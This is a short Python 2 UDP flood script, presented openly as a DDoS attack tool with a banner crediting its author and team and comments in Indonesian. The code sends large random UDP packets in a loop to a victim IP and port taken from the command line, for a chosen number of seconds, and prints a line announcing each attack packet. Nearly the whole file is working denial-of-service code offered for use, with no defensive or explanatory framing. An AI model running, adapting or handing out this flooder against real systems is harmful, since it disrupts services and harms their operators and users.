#@BAGUSXYZ
#YANG RECODE SEMOGA CEPAT MATI
import time
import socket
import random
import sys
def usage():
    print "\033[1;32m#########################################################"
    print "----------------[\033[00mDDOS ATTACK BY BAGUSXYZ\033[1;32m]--------------"
    print "   \033[1;91mCommand: " "python2 DDOS.py " "<ip> <port> <packet> \033[1;32m   "
    print "                                                       "
    print "\033[1;91mCreator:BagusXyz  "
    print"\033[1;91mGithub. : https://github.com/bagusxyz"
    print "\033[1;91mTeam   : INTRA     "
    print "\033[1;91mVersion:1.0                  "
    print "                  \033[1;91m<--[INDONESIA TRACKER]-->         \033[1;32m"
    print "#########################################################"
    print "\033[1;91mDILARANG RECODE TANPA IZIN DARI GITHUB BAGUSXYZ"
def flood(victim, vport, duration):
    # Support us yaakk... :)
    # Okey Jadi disini saya membuat server, Ketika saya memanggil "SOCK_DGRAM" itu  menunjukkan  UDP type program
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 20000 representasi satu byte ke server
    bytes = random._urandom(20000)
    timeout =  time.time() + duration
    sent = 3000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print "\033[1;91mBAGUSXYZ \033[01;33m%s \033[1;91mATTACKED SERVER \033[01;33m%s \033[1;91mPORT \033[01;33m%s "%(sent, victim, vport)
def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()

